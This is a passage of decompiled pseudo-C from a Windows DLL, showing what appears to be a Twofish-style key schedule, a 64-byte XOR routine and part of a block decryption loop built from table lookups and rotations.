  a1[15] = v3 ^ a2[15];
  a1[16] = v3 ^ a2[16];
  a1[17] = v3 ^ a2[17];
  a1[18] = v3 ^ a2[18];
  a1[19] = v3 ^ a2[19];
  a1[20] = v3 ^ a2[20];
  a1[21] = v3 ^ a2[21];
  a1[22] = v3 ^ a2[22];
  a1[23] = v3 ^ a2[23];
  a1[24] = v3 ^ a2[24];
  a1[25] = v3 ^ a2[25];
  a1[26] = v3 ^ a2[26];
  a1[27] = v3 ^ a2[27];
  a1[28] = v3 ^ a2[28];
  a1[29] = v3 ^ a2[29];
  a1[30] = v3 ^ a2[30];
  a1[31] = v3 ^ a2[31];
  a1[32] = v3 ^ a2[32];
  a1[33] = v3 ^ a2[33];
  a1[34] = v3 ^ a2[34];
  a1[35] = v3 ^ a2[35];
  a1[36] = v3 ^ a2[36];
  a1[37] = v3 ^ a2[37];
  a1[38] = v3 ^ a2[38];
  a1[39] = v3 ^ a2[39];
  a1[40] = v3 ^ a2[40];
  a1[41] = v3 ^ a2[41];
  a1[42] = v3 ^ a2[42];
  a1[43] = v3 ^ a2[43];
  a1[44] = v3 ^ a2[44];
  a1[45] = v3 ^ a2[45];
  a1[46] = v3 ^ a2[46];
  a1[47] = v3 ^ a2[47];
  a1[48] = v3 ^ a2[48];
  a1[49] = v3 ^ a2[49];
  a1[50] = v3 ^ a2[50];
  a1[51] = v3 ^ a2[51];
  a1[52] = v3 ^ a2[52];
  a1[53] = v3 ^ a2[53];
  a1[54] = v3 ^ a2[54];
  a1[55] = v3 ^ a2[55];
  a1[56] = v3 ^ a2[56];
  a1[57] = v3 ^ a2[57];
  a1[58] = v3 ^ a2[58];
  a1[59] = v3 ^ a2[59];
  a1[60] = v3 ^ a2[60];
  a1[61] = v3 ^ a2[61];
  a1[62] = v3 ^ a2[62];
  result = v3 ^ a2[63];
  a1[63] = result;
  return result;
}

//----- (10009371) --------------------------------------------------------
int __cdecl sub_10009371(int a1)
{
  int v1; // edi
  int v2; // esi
  _BYTE *v3; // ebx
  int v4; // ecx
  int *v5; // edx
  int v6; // eax
  int v7; // eax
  int *v8; // ecx
  int *v9; // ecx
  unsigned __int8 v10; // dl
  unsigned __int8 v11; // cl
  unsigned __int8 v12; // al
  unsigned __int8 v13; // cl
  unsigned __int8 v14; // dl
  unsigned __int8 v15; // al
  unsigned __int8 v16; // bl
  unsigned __int8 v17; // dl
  unsigned __int8 v18; // cl
  unsigned __int8 v19; // al
  unsigned __int8 v20; // bl
  unsigned __int8 v21; // dl
  unsigned __int8 v22; // cl
  unsigned __int8 v23; // al
  int v24; // edi
  int v25; // eax
  _DWORD *v26; // eax
  int v27; // edi
  int v28; // ecx
  bool v29; // zf
  int j; // eax
  int v31; // ecx
  int v32; // eax
  int v33; // ecx
  int v34; // ecx
  _DWORD *v35; // eax
  int v36; // edi
  int k; // eax
  int v38; // ecx
  int v39; // eax
  int v40; // ecx
  _DWORD *v41; // eax
  int v42; // ecx
  int m; // eax
  int v44; // ecx
  int v45; // eax
  int v46; // ecx
  int v47; // ecx
  _DWORD *v48; // eax
  int v49; // edi
  int n; // eax
  int v51; // ecx
  int v52; // eax
  int v53; // ecx
  int v54; // ecx
  _DWORD *v55; // eax
  int v56; // edi
  _DWORD *v57; // eax
  int v58; // ecx
  int v59; // ecx
  _DWORD *v60; // eax
  int v61; // edi
  _DWORD *v62; // eax
  int v63; // ecx
  int v64; // ecx
  _DWORD *v65; // eax
  int v66; // edi
  int v67; // ecx
  _DWORD *v68; // eax
  int v69; // edx
  int v70; // ecx
  _DWORD *v71; // eax
  int v72; // edx
  int v73; // edx
  int v74; // ecx
  _DWORD *v75; // eax
  int v76; // edi
  int v77; // edx
  int v78; // ecx
  _DWORD *v79; // eax
  int v80; // edi
  int v82; // [esp-8h] [ebp-264h]
  int v83; // [esp-4h] [ebp-260h]
  int v84[64]; // [esp+Ch] [ebp-250h] BYREF
  int v85[64]; // [esp+10Ch] [ebp-150h] BYREF
  int v86; // [esp+20Ch] [ebp-50h]
  int v87; // [esp+210h] [ebp-4Ch]
  _BYTE v88[16]; // [esp+214h] [ebp-48h]
  _BYTE v89[16]; // [esp+224h] [ebp-38h]
  _DWORD *v90; // [esp+234h] [ebp-28h]
  int v91; // [esp+238h] [ebp-24h]
  int *i; // [esp+23Ch] [ebp-20h]
  int *v93; // [esp+240h] [ebp-1Ch] BYREF
  unsigned __int8 v94; // [esp+244h] [ebp-18h]
  unsigned __int8 v95; // [esp+245h] [ebp-17h]
  unsigned __int8 v96; // [esp+246h] [ebp-16h]
  unsigned __int8 v97; // [esp+247h] [ebp-15h]
  unsigned __int8 v98; // [esp+248h] [ebp-14h]
  unsigned __int8 v99; // [esp+249h] [ebp-13h]
  unsigned __int8 v100; // [esp+24Ah] [ebp-12h]
  unsigned __int8 v101; // [esp+24Bh] [ebp-11h]
  unsigned __int8 v102; // [esp+24Ch] [ebp-10h]
  unsigned __int8 v103; // [esp+24Dh] [ebp-Fh]
  unsigned __int8 v104; // [esp+24Eh] [ebp-Eh]
  unsigned __int8 v105; // [esp+24Fh] [ebp-Dh]
  unsigned __int8 v106; // [esp+250h] [ebp-Ch]
  unsigned __int8 v107; // [esp+251h] [ebp-Bh]
  unsigned __int8 v108; // [esp+252h] [ebp-Ah]
  unsigned __int8 v109; // [esp+253h] [ebp-9h]
  int v110; // [esp+258h] [ebp-4h]

  v1 = 0;
  v2 = 0;
  if ( dword_10014F28 )
    sub_10008F11();
  v3 = (_BYTE *)a1;
  v110 = 0;
  v87 = 2 * *(_DWORD *)(a1 + 80) + 8;
  v86 = *(_DWORD *)(a1 + 4);
  v4 = (v86 + 63) / 64;
  v90 = (_DWORD *)v4;
  if ( v4 > 0 )
  {
    v5 = (int *)(a1 + 88);
    v91 = (int)&(&v93)[v4];
    v93 = (int *)(a1 + 4 * v4 + 112);
    for ( i = (int *)(a1 + 88); ; v5 = i )
    {
      v6 = 4 * v110;
      v83 = *v5;
      v82 = *(v5 - 1);
      *(_DWORD *)&v89[v6] = v82;
      *(_DWORD *)&v88[v6] = v83;
      v7 = sub_10008E91(v82, v83);
      ++v110;
      i += 2;
      v8 = v93--;
      *v8 = v7;
      v9 = (int *)v91;
      v91 -= 4;
      *v9 = v7;
      if ( v110 >= (int)v90 )
        break;
    }
    LOBYTE(v4) = (_BYTE)v90;
  }
  i = 0;
  if ( v87 / 2 > 0 )
  {
    v93 = (int *)(v4 & 3);
    v90 = (_DWORD *)(a1 + 136);
    v91 = v87 / 2;
    while ( 1 )
    {
      v110 = (int)i;
      if ( !v93 )
      {
        v10 = v89[12] ^ byte_10014E28[(unsigned __int8)i];
        BYTE1(v110) = v89[13] ^ byte_10014D28[BYTE1(v110)];
        v11 = v89[14] ^ byte_10014D28[BYTE2(v110)];
        v12 = v89[15] ^ byte_10014E28[HIBYTE(v110)];
        goto LABEL_16;
      }
      if ( v93 == (int *)2 )
        break;
      if ( v93 == (int *)3 )
      {
        v12 = HIBYTE(v110);
        v11 = BYTE2(v110);
        v10 = v110;
LABEL_16:
        v13 = v89[10] ^ byte_10014D28[v11];
        LOBYTE(v110) = v89[8] ^ byte_10014E28[v10];
        v14 = v89[9] ^ byte_10014E28[BYTE1(v110)];
        v15 = v89[11] ^ byte_10014D28[v12];
LABEL_18:
        v2 = dword_100161E0[v89[0] ^ (unsigned __int8)byte_10014D28[v89[4] ^ (unsigned __int8)byte_10014D28[(unsigned __int8)v110]]] ^ dword_100165E0[v89[1] ^ (unsigned __int8)byte_10014D28[v89[5] ^ (unsigned __int8)byte_10014E28[v14]]] ^ dword_100169E0[v89[2] ^ (unsigned __int8)byte_10014E28[v89[6] ^ (unsigned __int8)byte_10014D28[v13]]] ^ dword_10016DE0[v89[3] ^ (unsigned __int8)byte_10014E28[v89[7] ^ (unsigned __int8)byte_10014E28[v15]]];
      }
      v110 = (int)i + 16843009;
      if ( v93 )
      {
        if ( v93 == (int *)2 )
        {
          v23 = HIBYTE(v110);
          v22 = BYTE2(v110);
          v21 = BYTE1(v110);
          v20 = v110;
          goto LABEL_27;
        }
        if ( v93 != (int *)3 )
          goto LABEL_28;
        v19 = HIBYTE(v110);
        v18 = BYTE2(v110);
        v17 = BYTE1(v110);
        v16 = v110;
      }
      else
      {
        v16 = v88[12] ^ byte_10014E28[(unsigned __int8)v110];
        v17 = v88[13] ^ byte_10014D28[BYTE1(v110)];
        v18 = v88[14] ^ byte_10014D28[BYTE2(v110)];
        v19 = v88[15] ^ byte_10014E28[HIBYTE(v110)];
      }
      v20 = v88[8] ^ byte_10014E28[v16];
      v21 = v88[9] ^ byte_10014E28[v17];
      v22 = v88[10] ^ byte_10014D28[v18];
      v23 = v88[11] ^ byte_10014D28[v19];
LABEL_27:
      v24 = dword_100169E0[v88[2] ^ (unsigned __int8)byte_10014E28[v88[6] ^ (unsigned __int8)byte_10014D28[v22]]] ^ dword_10016DE0[v88[3] ^ (unsigned __int8)byte_10014E28[v88[7] ^ (unsigned __int8)byte_10014E28[v23]]];
      v25 = v20;
      v3 = (_BYTE *)a1;
      v1 = dword_100161E0[v88[0] ^ (unsigned __int8)byte_10014D28[v88[4] ^ (unsigned __int8)byte_10014D28[v25]]] ^ dword_100165E0[v88[1] ^ (unsigned __int8)byte_10014D28[v88[5] ^ (unsigned __int8)byte_10014E28[v21]]] ^ v24;
LABEL_28:
      v26 = v90;
      i = (int *)((char *)i + 33686018);
      v27 = __ROL4__(v1, 8);
      v28 = v27 + v2;
      v1 = v2 + 2 * v27;
      *(v90 - 1) = v28;
      *v26 = __ROL4__(v1, 9);
      v29 = v91-- == 1;
      v90 = v26 + 2;
      if ( v29 )
        goto LABEL_29;
    }
    v15 = HIBYTE(v110);
    v13 = BYTE2(v110);
    v14 = BYTE1(v110);
    goto LABEL_18;
  }
LABEL_29:
  switch ( v86 )
  {
    case 128:
      sub_1000909D(v85, byte_10014D28, v98);
      v67 = v94;
      v110 = 0;
      v68 = v3 + 300;
      do
      {
        *(v68 - 2) = dword_100161E0[v67 ^ (unsigned __int8)byte_10014D28[*((unsigned __int8 *)v85 + v110)]];
        v69 = v110;
        v110 += 2;
        *v68 = dword_100161E0[v67 ^ (unsigned __int8)byte_10014D28[*((unsigned __int8 *)v85 + v69 + 1)]];
        v68 += 4;
      }
      while ( v110 < 256 );
      sub_1000909D(v85, byte_10014E28, v99);
      v70 = v95;
      v110 = 0;
      v71 = v3 + 304;
      do
      {
        *(v71 - 2) = dword_100165E0[v70 ^ (unsigned __int8)byte_10014D28[*((unsigned __int8 *)v85 + v110)]];
        v72 = v110;
        v110 += 2;
        *v71 = dword_100165E0[v70 ^ (unsigned __int8)byte_10014D28[*((unsigned __int8 *)v85 + v72 + 1)]];
        v71 += 4;
      }
      while ( v110 < 256 );
      sub_1000909D(v85, byte_10014D28, v100);
      v73 = v96;
      v74 = 0;
      v75 = v3 + 2348;
      do
      {
        *(v75 - 2) = dword_100169E0[v73 ^ (unsigned __int8)byte_10014E28[*((unsigned __int8 *)v85 + v74)]];
        v76 = v73 ^ (unsigned __int8)byte_10014E28[*((unsigned __int8 *)v85 + v74 + 1)];
        v74 += 2;
        *v75 = dword_100169E0[v76];
        v75 += 4;
      }
      while ( v74 < 256 );
      sub_1000909D(v85, byte_10014E28, v101);
      v77 = v97;
      v78 = 0;
      v79 = v3 + 2352;
      do
      {
        *(v79 - 2) = dword_10016DE0[v77 ^ (unsigned __int8)byte_10014E28[*((unsigned __int8 *)v85 + v78)]];
        v80 = v77 ^ (unsigned __int8)byte_10014E28[*((unsigned __int8 *)v85 + v78 + 1)];
        v78 += 2;
        *v79 = dword_10016DE0[v80];
        v79 += 4;
      }
      while ( v78 < 256 );
      break;
    case 192:
      sub_1000909D(v85, byte_10014E28, v102);
      v110 = 0;
      v57 = v3 + 300;
      do
      {
        *(v57 - 2) = dword_100161E0[v94 ^ (unsigned __int8)byte_10014D28[v98 ^ (unsigned __int8)byte_10014D28[*((unsigned __int8 *)v85 + v110)]]];
        v58 = v110;
        v110 += 2;
        *v57 = dword_100161E0[v94 ^ (unsigned __int8)byte_10014D28[v98 ^ (unsigned __int8)byte_10014D28[*((unsigned __int8 *)v85 + v58 + 1)]]];
        v57 += 4;
      }
      while ( v110 < 256 );
      sub_1000909D(v85, byte_10014E28, v103);
      v59 = 0;
      v60 = v3 + 304;
      do
      {
        *(v60 - 2) = dword_100165E0[v95 ^ (unsigned __int8)byte_10014D28[v99 ^ (unsigned __int8)byte_10014E28[*((unsigned __int8 *)v85 + v59)]]];
        v61 = v95 ^ (unsigned __int8)byte_10014D28[v99 ^ (unsigned __int8)byte_10014E28[*((unsigned __int8 *)v85
                                                                                        + v59
                                                                                        + 1)]];
        v59 += 2;
        *v60 = dword_100165E0[v61];
        v60 += 4;
      }
      while ( v59 < 256 );
      sub_1000909D(v85, byte_10014D28, v104);
      v110 = 0;
      v62 = v3 + 2348;
      do
      {
        *(v62 - 2) = dword_100169E0[v96 ^ (unsigned __int8)byte_10014E28[v100 ^ (unsigned __int8)byte_10014D28[*((unsigned __int8 *)v85 + v110)]]];
        v63 = v110;
        v110 += 2;
        *v62 = dword_100169E0[v96 ^ (unsigned __int8)byte_10014E28[v100 ^ (unsigned __int8)byte_10014D28[*((unsigned __int8 *)v85 + v63 + 1)]]];
        v62 += 4;
      }
      while ( v110 < 256 );
      sub_1000909D(v85, byte_10014D28, v105);
      v64 = 0;
      v65 = v3 + 2352;
      do
      {
        *(v65 - 2) = dword_10016DE0[v97 ^ (unsigned __int8)byte_10014E28[v101 ^ (unsigned __int8)byte_10014E28[*((unsigned __int8 *)v85 + v64)]]];
        v66 = v97 ^ (unsigned __int8)byte_10014E28[v101 ^ (unsigned __int8)byte_10014E28[*((unsigned __int8 *)v85
                                                                                         + v64
                                                                                         + 1)]];
        v64 += 2;
        *v65 = dword_10016DE0[v66];
        v65 += 4;
      }
      while ( v64 < 256 );
      break;
    case 256:
      sub_1000909D(v84, byte_10014E28, v106);
      for ( j = 0; j < 256; *((_BYTE *)&v84[63] + j + 3) = byte_10014E28[v33] )
      {
        v31 = *((unsigned __int8 *)v84 + j);
        v32 = j + 1;
        *((_BYTE *)&v84[63] + v32 + 3) = byte_10014E28[v31];
        v33 = *((unsigned __int8 *)v84 + v32);
        j = v32 + 1;
      }
      sub_1000909D(v85, v85, v102);
      v34 = 0;
      v35 = v3 + 300;
      do
      {
        *(v35 - 2) = dword_100161E0[v94 ^ (unsigned __int8)byte_10014D28[v98 ^ (unsigned __int8)byte_10014D28[*((unsigned __int8 *)v85 + v34)]]];
        v36 = v94 ^ (unsigned __int8)byte_10014D28[v98 ^ (unsigned __int8)byte_10014D28[*((unsigned __int8 *)v85
                                                                                        + v34
                                                                                        + 1)]];
        v34 += 2;
        *v35 = dword_100161E0[v36];
        v35 += 4;
      }
      while ( v34 < 256 );
      sub_1000909D(v84, byte_10014D28, v107);
      for ( k = 0; k < 256; *((_BYTE *)&v84[63] + k + 3) = byte_10014E28[v40] )
      {
        v38 = *((unsigned __int8 *)v84 + k);
        v39 = k + 1;
        *((_BYTE *)&v84[63] + v39 + 3) = byte_10014E28[v38];
        v40 = *((unsigned __int8 *)v84 + v39);
        k = v39 + 1;
      }
      sub_1000909D(v85, v85, v103);
      v110 = 0;
      v41 = v3 + 304;
      do
      {
        *(v41 - 2) = dword_100165E0[v95 ^ (unsigned __int8)byte_10014D28[v99 ^ (unsigned __int8)byte_10014E28[*((unsigned __int8 *)v85 + v110)]]];
        v42 = v110;
        v110 += 2;
        *v41 = dword_100165E0[v95 ^ (unsigned __int8)byte_10014D28[v99 ^ (unsigned __int8)byte_10014E28[*((unsigned __int8 *)v85 + v42 + 1)]]];
        v41 += 4;
      }
      while ( v110 < 256 );
      sub_1000909D(v84, byte_10014D28, v108);
      for ( m = 0; m < 256; *((_BYTE *)&v84[63] + m + 3) = byte_10014D28[v46] )
      {
        v44 = *((unsigned __int8 *)v84 + m);
        v45 = m + 1;
        *((_BYTE *)&v84[63] + v45 + 3) = byte_10014D28[v44];
        v46 = *((unsigned __int8 *)v84 + v45);
        m = v45 + 1;
      }
      sub_1000909D(v85, v85, v104);
      v47 = 0;
      v48 = v3 + 2348;
      do
      {
        *(v48 - 2) = dword_100169E0[v96 ^ (unsigned __int8)byte_10014E28[v100 ^ (unsigned __int8)byte_10014D28[*((unsigned __int8 *)v85 + v47)]]];
        v49 = v96 ^ (unsigned __int8)byte_10014E28[v100 ^ (unsigned __int8)byte_10014D28[*((unsigned __int8 *)v85
                                                                                         + v47
                                                                                         + 1)]];
        v47 += 2;
        *v48 = dword_100169E0[v49];
        v48 += 4;
      }
      while ( v47 < 256 );
      sub_1000909D(v84, byte_10014E28, v109);
      for ( n = 0; n < 256; *((_BYTE *)&v84[63] + n + 3) = byte_10014D28[v53] )
      {
        v51 = *((unsigned __int8 *)v84 + n);
        v52 = n + 1;
        *((_BYTE *)&v84[63] + v52 + 3) = byte_10014D28[v51];
        v53 = *((unsigned __int8 *)v84 + v52);
        n = v52 + 1;
      }
      sub_1000909D(v85, v85, v105);
      v54 = 0;
      v55 = v3 + 2352;
      do
      {
        *(v55 - 2) = dword_10016DE0[v97 ^ (unsigned __int8)byte_10014E28[v101 ^ (unsigned __int8)byte_10014E28[*((unsigned __int8 *)v85 + v54)]]];
        v56 = v97 ^ (unsigned __int8)byte_10014E28[v101 ^ (unsigned __int8)byte_10014E28[*((unsigned __int8 *)v85
                                                                                         + v54
                                                                                         + 1)]];
        v54 += 2;
        *v55 = dword_10016DE0[v56];
        v55 += 4;
      }
      while ( v54 < 256 );
      break;
  }
  if ( !*v3 )
    sub_1000905D((int)v3, 0);
  return 1;
}
// 10014F28: using guessed type int dword_10014F28;
// 100161E0: using guessed type int dword_100161E0[256];
// 100165E0: using guessed type int dword_100165E0[256];
// 100169E0: using guessed type int dword_100169E0[256];
// 10016DE0: using guessed type int dword_10016DE0[];

//----- (10009DE3) --------------------------------------------------------
int __cdecl sub_10009DE3(int a1, char a2, int a3, _BYTE *a4)
{
  int v4; // eax

  *(_BYTE *)a1 = a2;
  v4 = a3 + 63;
  LOBYTE(v4) = (a3 + 63) & 0xC0;
  *(_DWORD *)(a1 + 4) = v4;
  *(_DWORD *)(a1 + 80) = dword_10014F2C[(a3 - 1) / 64];
  memset((void *)(a1 + 84), 0, 0x20u);
  *(_BYTE *)(a1 + 72) = 0;
  if ( !a4 || !*a4 )
    return 1;
  if ( !sub_10008DE6(a3, (int)a4, (_DWORD *)(a1 + 84), a1 + 8) )
    return sub_10009371(a1);
  return -2;
}
// 10014F2C: using guessed type int dword_10014F2C[4];

//----- (10009E57) --------------------------------------------------------
int __cdecl sub_10009E57(int a1, char a2, int a3)
{
  _DWORD *v3; // eax
  int v4; // ecx

  if ( a2 == 1 || !a3 )
    goto LABEL_7;
  if ( !sub_10008DE6(128, a3, (_DWORD *)(a1 + 24), 0) )
  {
    v3 = (_DWORD *)(a1 + 1);
    v4 = 4;
    do
    {
      *v3 = *(_DWORD *)((char *)v3 + 23);
      ++v3;
      --v4;
    }
    while ( v4 );
LABEL_7:
    *(_BYTE *)a1 = a2;
    return 1;
  }
  return -8;
}

//----- (10009EA5) --------------------------------------------------------
int __cdecl sub_10009EA5(unsigned __int8 *a1, int a2, _DWORD *a3, int a4, int *a5)
{
  unsigned __int8 *v6; // edi
  int v7; // ebx
  unsigned __int8 v8; // al
  _BYTE *v9; // ecx
  char v10; // al
  int *v11; // edx
  int v12; // eax
  int v13; // ecx
  int v14; // edi
  int v15; // edx
  int v16; // edx
  int v17; // edx
  int v18; // ecx
  int v19; // edx
  int v20; // ecx
  int v21; // edx
  int v22; // ecx
  int v23; // edx
  int v24; // ecx
  int v25; // edx
  int v26; // ecx
  int v27; // edx
  int v28; // ecx
  int v29; // edx
  int v30; // ecx
  int v31; // edx
  int v32; // ecx
  int v33; // edx
  int v34; // ecx
  int v35; // edx
  int v36; // ecx
  int v37; // edx
  int v38; // ecx
  int v39; // edx
  int v40; // ecx
  int v41; // edx
  int v42; // ecx
  int v43; // edx
  int v44; // ecx
  int v45; // edx
  int v46; // ecx
  int v47; // edx
  int v48; // ecx
  int v49; // ebx
  int v50; // ecx
  int v51; // edx
  int v52; // ecx
  bool v53; // zf
  int v55[40]; // [esp+Ch] [ebp-C8h] BYREF
  int v56; // [esp+ACh] [ebp-28h]
  int v57; // [esp+B0h] [ebp-24h]
  int v58; // [esp+B4h] [ebp-20h]
  int v59; // [esp+B8h] [ebp-1Ch]
  int v60; // [esp+BCh] [ebp-18h]
  int v61; // [esp+C0h] [ebp-14h]
  int v62; // [esp+C4h] [ebp-10h] BYREF
  int v63; // [esp+C8h] [ebp-Ch]
  int v64; // [esp+CCh] [ebp-8h]
  int v65; // [esp+D0h] [ebp-4h]
  char v66; // [esp+DCh] [ebp+8h]
  char v67; // [esp+DFh] [ebp+Bh]
  int v68; // [esp+E0h] [ebp+Ch]
  unsigned int v69; // [esp+E0h] [ebp+Ch]

  v6 = a1;
  v7 = *a1;
  v68 = *(_DWORD *)(a2 + 80);
  v56 = v7;
  if ( v7 == 3 )
  {
    v61 = 0;
    for ( *a1 = 1; v61 < a4; ++v61 )
    {
      sub_10009EA5(v6, a2, v6 + 1, 128, &v62);
      v66 = v61 & 7;
      v8 = ((unsigned __int8)(v62 & 0x80) >> (v61 & 7)) ^ (128 >> (v61 & 7)) & *((_BYTE *)a3 + v61 / 8);
      *((_BYTE *)a5 + v61 / 8) = v8 | *((_BYTE *)a5 + v61 / 8) & ~(128 >> (v61 & 7));
      v9 = v6 + 16;
      v67 = v8 >> (7 - v66);
      do
      {
        v10 = *v9 >> 7;
        *v9 = v67 ^ (2 * *v9);
        --v9;
        v67 = v10;
      }
      while ( (int)&v9[-1 - (_DWORD)v6] >= 0 );
    }
    *v6 = 3;
  }
  else
  {
    if ( *(_BYTE *)a2 )
      sub_1000905D(a2, 0);
    memcpy(v55, (const void *)(a2 + 132), 8 * v68 + 32);
    if ( v7 == 2 )
    {
      v57 = *((_DWORD *)a1 + 6);
      v58 = *((_DWORD *)a1 + 7);
      v59 = *((_DWORD *)a1 + 8);
      v60 = *((_DWORD *)a1 + 9);
    }
    else
    {
      v60 = 0;
      v59 = 0;
      v58 = 0;
      v57 = 0;
    }
    if ( a4 > 0 )
    {
      v11 = a3;
      v69 = (unsigned int)(a4 + 127) >> 7;
      do
      {
        v12 = *v11;
        v13 = v11[1];
        v14 = v11[2];
        v15 = v60 ^ v55[3] ^ v11[3];
        v62 = v57 ^ v55[0] ^ v12;
        v65 = v15;
        v63 = v58 ^ v55[1] ^ v13;
        v64 = v59 ^ v55[2] ^ v14;
        v16 = *(_DWORD *)(a2 + 8 * BYTE2(v62) + 2340) ^ *(_DWORD *)(a2 + 8 * BYTE1(v62) + 296) ^ *(_DWORD *)(a2 + 8 * HIBYTE(v62) + 2344);
        v61 = (unsigned __int8)v63;
        v17 = *(_DWORD *)(a2 + 8 * (unsigned __int8)v62 + 292) ^ v16;
        v18 = *(_DWORD *)(a2 + 8 * HIBYTE(v63) + 292) ^ *(_DWORD *)(a2 + 8 * BYTE1(v63) + 2340) ^ *(_DWORD *)(a2 + 8 * (unsigned __int8)v63 + 296) ^ *(_DWORD *)(a2 + 8 * BYTE2(v63) + 2344);
        v61 = __ROL4__(v65, 1);
        v65 = (v17 + v55[39] + 2 * v18) ^ v61;
        v64 = __ROR4__((v17 + v18 + v55[38]) ^ v64, 1);
        v19 = *(_DWORD *)(a2 + 8 * (unsigned __int8)v64 + 292) ^ *(_DWORD *)(a2 + 8 * BYTE2(v64) + 2340) ^ *(_DWORD *)(a2 + 8 * BYTE1(v64) + 296) ^ *(_DWORD *)(a2 + 8 * HIBYTE(v64) + 2344);
        v20 = *(_DWORD *)(a2 + 8 * HIBYTE(v65) + 292) ^ *(_DWORD *)(a2 + 8 * BYTE1(v65) + 2340) ^ *(_DWORD *)(a2 + 8 * (unsigned __int8)v65 + 296) ^ *(_DWORD *)(a2 + 8 * BYTE2(v65) + 2344);
        v62 = __ROR4__((v19 + v20 + v55[36]) ^ v62, 1);
        v63 = (v19 + v55[37] + 2 * v20) ^ __ROL4__(v63, 1);
        v21 = *(_DWORD *)(a2 + 8 * (unsigned __int8)v62 + 292) ^ *(_DWORD *)(a2 + 8 * BYTE2(v62) + 2340) ^ *(_DWORD *)(a2 + 8 * BYTE1(v62) + 296) ^ *(_DWORD *)(a2 + 8 * HIBYTE(v62) + 2344);
        v22 = *(_DWORD *)(a2 + 8 * HIBYTE(v63) + 292) ^ *(_DWORD *)(a2 + 8 * BYTE1(v63) + 2340) ^ *(_DWORD *)(a2 + 8 * (unsigned __int8)v63 + 296) ^ *(_DWORD *)(a2 + 8 * BYTE2(v63) + 2344);
        v65 = (v21 + v55[35] + 2 * v22) ^ __ROL4__(v65, 1);
        v64 = __ROR4__((v21 + v55[34] + v22) ^ v64, 1);
        v23 = *(_DWORD *)(a2 + 8 * (unsigned __int8)v64 + 292) ^ *(_DWORD *)(a2 + 8 * BYTE2(v64) + 2340) ^ *(_DWORD *)(a2 + 8 * BYTE1(v64) + 296) ^ *(_DWORD *)(a2 + 8 * HIBYTE(v64) + 2344);
        v24 = *(_DWORD *)(a2 + 8 * HIBYTE(v65) + 292) ^ *(_DWORD *)(a2 + 8 * BYTE1(v65) + 2340) ^ *(_DWORD *)(a2 + 8 * (unsigned __int8)v65 + 296) ^ *(_DWORD *)(a2 + 8 * BYTE2(v65) + 2344);
        v62 = __ROR4__((v23 + v55[32] + v24) ^ v62, 1);
        v63 = (v23 + v55[33] + 2 * v24) ^ __ROL4__(v63, 1);
        v25 = *(_DWORD *)(a2 + 8 * (unsigned __int8)v62 + 292) ^ *(_DWORD *)(a2 + 8 * BYTE2(v62) + 2340) ^ *(_DWORD *)(a2 + 8 * BYTE1(v62) + 296) ^ *(_DWORD *)(a2 + 8 * HIBYTE(v62) + 2344);
        v26 = *(_DWORD *)(a2 + 8 * HIBYTE(v63) + 292) ^ *(_DWORD *)(a2 + 8 * BYTE1(v63) + 2340) ^ *(_DWORD *)(a2 + 8 * (unsigned __int8)v63 + 296) ^ *(_DWORD *)(a2 + 8 * BYTE2(v63) + 2344);
        v65 = (v25 + v55[31] + 2 * v26) ^ __ROL4__(v65, 1);
        v64 = __ROR4__((v25 + v55[30] + v26) ^ v64, 1);
        v27 = *(_DWORD *)(a2 + 8 * (unsigned __int8)v64 + 292) ^ *(_DWORD *)(a2 + 8 * BYTE2(v64) + 2340) ^ *(_DWORD *)(a2 + 8 * BYTE1(v64) + 296) ^ *(_DWORD *)(a2 + 8 * HIBYTE(v64) + 2344);
        v28 = *(_DWORD *)(a2 + 8 * HIBYTE(v65) + 292) ^ *(_DWORD *)(a2 + 8 * BYTE1(v65) + 2340) ^ *(_DWORD *)(a2 + 8 * (unsigned __int8)v65 + 296) ^ *(_DWORD *)(a2 + 8 * BYTE2(v65) + 2344);
        v62 = __ROR4__((v27 + v55[28] + v28) ^ v62, 1);
        v63 = (v27 + v55[29] + 2 * v28) ^ __ROL4__(v63, 1);
        v29 = *(_DWORD *)(a2 + 8 * (unsigned __int8)v62 + 292) ^ *(_DWORD *)(a2 + 8 * BYTE2(v62) + 2340) ^ *(_DWORD *)(a2 + 8 * BYTE1(v62) + 296) ^ *(_DWORD *)(a2 + 8 * HIBYTE(v62) + 2344);
        v30 = *(_DWORD *)(a2 + 8 * HIBYTE(v63) + 292) ^ *(_DWORD *)(a2 + 8 * BYTE1(v63) + 2340) ^ *(_DWORD *)(a2 + 8 * (unsigned __int8)v63 + 296) ^ *(_DWORD *)(a2 + 8 * BYTE2(v63) + 2344);
        v65 = (v29 + v55[27] + 2 * v30) ^ __ROL4__(v65, 1);
        v64 = __ROR4__((v29 + v55[26] + v30) ^ v64, 1);
        v31 = *(_DWORD *)(a2 + 8 * (unsigned __int8)v64 + 292) ^ *(_DWORD *)(a2 + 8 * BYTE2(v64) + 2340) ^ *(_DWORD *)(a2 + 8 * BYTE1(v64) + 296) ^ *(_DWORD *)(a2 + 8 * HIBYTE(v64) + 2344);
        v32 = *(_DWORD *)(a2 + 8 * HIBYTE(v65) + 292) ^ *(_DWORD *)(a2 + 8 * BYTE1(v65) + 2340) ^ *(_DWORD *)(a2 + 8 * (unsigned __int8)v65 + 296) ^ *(_DWORD *)(a2 + 8 * BYTE2(v65) + 2344);
        v62 = __ROR4__((v31 + v55[24] + v32) ^ v62, 1);
        v63 = (v31 + v55[25] + 2 * v32) ^ __ROL4__(v63, 1);
        v33 = *(_DWORD *)(a2 + 8 * (unsigned __int8)v62 + 292) ^ *(_DWORD *)(a2 + 8 * BYTE2(v62) + 2340) ^ *(_DWORD *)(a2 + 8 * BYTE1(v62) + 296) ^ *(_DWORD *)(a2 + 8 * HIBYTE(v62) + 2344);
        v34 = *(_DWORD *)(a2 + 8 * HIBYTE(v63) + 292) ^ *(_DWORD *)(a2 + 8 * BYTE1(v63) + 2340) ^ *(_DWORD *)(a2 + 8 * (unsigned __int8)v63 + 296) ^ *(_DWORD *)(a2 + 8 * BYTE2(v63) + 2344);
        v65 = (v33 + v55[23] + 2 * v34) ^ __ROL4__(v65, 1);
        v64 = __ROR4__((v33 + v55[22] + v34) ^ v64, 1);
        v35 = *(_DWORD *)(a2 + 8 * (unsigned __int8)v64 + 292) ^ *(_DWORD *)(a2 + 8 * BYTE2(v64) + 2340) ^ *(_DWORD *)(a2 + 8 * BYTE1(v64) + 296) ^ *(_DWORD *)(a2 + 8 * HIBYTE(v64) + 2344);
